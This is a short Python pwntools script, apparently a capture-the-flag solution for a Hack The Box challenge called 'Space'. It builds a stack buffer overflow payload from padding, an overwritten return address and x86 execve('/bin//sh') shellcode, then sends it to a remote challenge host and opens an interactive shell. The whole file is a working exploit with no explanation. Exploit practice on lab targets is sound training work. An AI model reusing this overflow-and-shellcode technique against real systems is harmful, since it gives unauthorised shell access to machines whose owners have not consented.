from pwn import *

payload = 'A'*22+p32(0x08049192)+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

p = remote('docker.hackthebox.eu', 31153)
#p = process('./Space')
print p.recv()
p.sendline(payload)
p.interactive()
